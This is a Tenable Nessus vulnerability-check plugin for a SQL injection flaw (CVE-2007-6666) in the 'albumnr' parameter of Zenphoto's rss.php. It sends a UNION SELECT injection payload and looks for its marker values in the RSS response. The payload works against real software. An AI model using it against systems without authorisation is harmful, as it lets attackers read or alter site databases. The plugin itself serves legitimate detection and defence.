#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(29832);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2007-6666");
  script_bugtraq_id(27084);
  script_xref(name:"OSVDB", value:"39786");

  script_name(english:"Zenphoto rss.php albumnr Parameter SQL Injection");
  script_summary(english:"Tries to influence the RSS results returned");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Zenphoto, a photo gallery
application written in PHP. 

The version of Zenphoto installed on the remote host fails to sanitize
input to the 'albumnr' parameter of the 'rss.php' script before using
it in a database query.  Regardless of PHP's 'magic_quotes_gpc' and
'register_globals' settings, an attacker may be able to exploit this
issue to manipulate database queries, leading to disclosure of
sensitive information, modification of data, or attacks against the
underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4823" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/zenphoto", "/album", "/gallery", "/photos", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to manipulate the RSS results returned.
  magic1 = unixtime();
  magic2 = rand();
  exploit = string("9999 UNION SELECT 0,0,0,", magic1, ",", magic2, ",0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--");

  u = string(
      dir, "/rss.php?",
      "albumnr=", urlencode(str:exploit)
    );
  r = http_send_recv3(port:port, method: "GET", item: u);
  if (isnull(r)) exit(0);
  res = r[2];
  # There's a problem if...
  if (
    # it's ZenPhoto and...
    "ZenPhoto Album RSS Generator" >< res &&
    # we see our magic in the answer.
    string("<title>", magic1, "<") >< res &&
    string("/a>", magic2, "]]") >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
